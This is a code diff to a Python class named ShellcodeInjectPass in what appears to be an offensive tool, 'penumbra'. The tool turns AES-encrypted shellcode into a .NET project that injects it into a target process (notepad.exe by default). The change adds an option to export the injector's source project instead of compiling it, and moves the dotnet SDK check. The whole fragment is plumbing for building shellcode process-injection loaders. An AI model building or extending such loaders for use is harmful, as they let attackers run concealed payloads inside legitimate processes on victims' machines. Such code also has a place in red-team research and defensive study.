@@ -188,9 +188,6 @@ class ShellcodeInjectPass:
                 "[32-byte key][16-byte IV][ciphertext]."
             )
 
-        if not shutil.which("dotnet"):
-            raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
-
         target = str(config.extra.get("inject_process", "notepad.exe"))
 
         key = data[:32]
@@ -208,6 +205,17 @@ class ShellcodeInjectPass:
             _generate_inject_project(
                 encrypted_b64, key_b64, iv_b64, target, tmp_path
             )
+
+            if config.extra.get("source"):
+                from penumbra.dotnet._loader_utils import export_source_project
+
+                output_dir = Path(str(config.extra.get("source_output", tmp_path)))
+                export_source_project(tmp_path, output_dir)
+                return b""
+
+            if not shutil.which("dotnet"):
+                raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
             return compile_dotnet_project(tmp_path, "net472")
         finally:
-            shutil.rmtree(tmp_dir, ignore_errors=True)
+            if not config.extra.get("source"):
+                shutil.rmtree(tmp_dir, ignore_errors=True)
